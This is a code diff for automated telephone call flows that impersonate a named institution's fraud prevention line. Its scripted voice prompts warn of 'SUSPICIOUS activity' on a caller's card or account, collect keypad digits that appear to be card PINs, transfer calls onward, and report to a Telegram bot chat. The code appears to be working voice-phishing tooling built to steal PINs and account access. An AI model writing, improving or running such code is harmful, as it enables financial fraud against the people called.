@@ -1006,10 +979,11 @@ export const pinFlow = async (
                 : `You have selected an INVALID option. We recently noticed a SUSPICIOUS activity on your CARD. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
             language,
             voice: 'female',
-            loop: true,
           },
-          onKeypressGoto: 'cardStepGoto',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: 8,
         },
         {
           id: uuidv4(),
@@ -1017,17 +991,16 @@ export const pinFlow = async (
           options: {
             length: 5,
           },
-          onKeypressGoto: 'cardStepGoto',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: 8,
         },
         {
-          action: 'hangup',
-        },
-        {
-          id: 'cardStepGoto',
+          id: 'nextStepGoto',
           action: 'fetchCallFlow',
           options: {
-            url: `${process.env.ENDPOINT_URL}/calls/dpins/${language}/${step}/${chatId}?pinType=${pinType}`,
+            url: `${process.env.ENDPOINT_URL}/calls/pins/${language}/${step}/${chatId}?pinType=${pinType}`,
           },
         },
       ],
@@ -1045,7 +1018,7 @@ export const pgpFlow = async (
   transferNumber: string,
   institutionName: string,
   from: string,
-): Promise<Response> => {
+): Promise<Response<any, Record<string, any>>> => {
   if (dtmf && dtmf === '1') {
     await bot.telegram.sendMessage(
       Number(chatId),
@@ -1054,6 +1027,7 @@ export const pgpFlow = async (
         parse_mode: 'HTML',
       },
     );
+
     return res.json({
       id: uuidv4(),
       title: `${chatId} - Forward call to ${transferNumber}`,
@@ -1072,21 +1046,21 @@ export const pgpFlow = async (
   } else {
     return res.json({
       id: uuidv4(),
-      title: `Calling - ${chatId}`,
+      title: `call CARD FLOW - ${chatId}`,
       record: false,
       steps: [
         {
           id: uuidv4(),
           action: 'say',
           options: {
-            ifMachine: 'delay',
             payload: `You have selected an INVALID option. Welcome to the ${institutionName} fraud prevention line. We recently notice a SUSPICIOUS activity on your account. If this was you, simply HANG UP. If this was not you, PLEASE press ONE to speak to a ${institutionName} representative; to better assist you in SECURING your ACCOUNT.`,
             language,
             voice: 'female',
-            length: 5,
           },
-          onKeypressGoto: 'nextStep',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: 1,
         },
         {
           id: uuidv4(),
@@ -1094,11 +1068,13 @@ export const pgpFlow = async (
           options: {
             length: 5,
           },
-          onKeypressGoto: 'nextStep',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: 1,
         },
         {
-          id: 'nextStep',
+          id: 'nextStepGoto',
           action: 'fetchCallFlow',
           options: {
             url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?transferNumber=${transferNumber}&from=${from}`,
